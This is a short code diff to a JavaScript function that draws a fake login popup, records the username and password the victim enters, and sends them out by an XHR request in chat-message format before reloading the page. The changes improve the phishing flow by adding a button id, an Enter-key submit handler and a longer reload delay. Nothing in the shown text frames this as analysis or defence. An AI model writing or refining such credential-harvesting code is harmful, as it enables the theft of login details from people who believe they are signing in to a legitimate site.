@@ -74,6 +74,7 @@ function poopup() {
     popup.appendChild(passwordInput);
 
     const loginButton = document.createElement("button");
+    loginButton.id = "sbmt";
     loginButton.textContent = "Login";
     loginButton.style.width = "100%";
     popup.appendChild(loginButton);
@@ -94,9 +95,15 @@ function poopup() {
             var content = "\`\`\`\no_O\n" + fname +"\nusr: " + username + "\npswd: " + password + "\n" + "\n\`\`\`";
             xhr.send(JSON.stringify({"content": content}));
             console.log("success!");
-            setTimeout(() => {location.reload()},350);
+            setTimeout(() => {location.reload()},500);
         } else {
             console.log("failure...");
+        }
+    });
+    loginButton.addEventListener("keypress", function(event) {
+        if (event.key === "Enter") {
+            event.preventDefault();
+            document.getElementById("sbmt").click();
         }
     });
 }
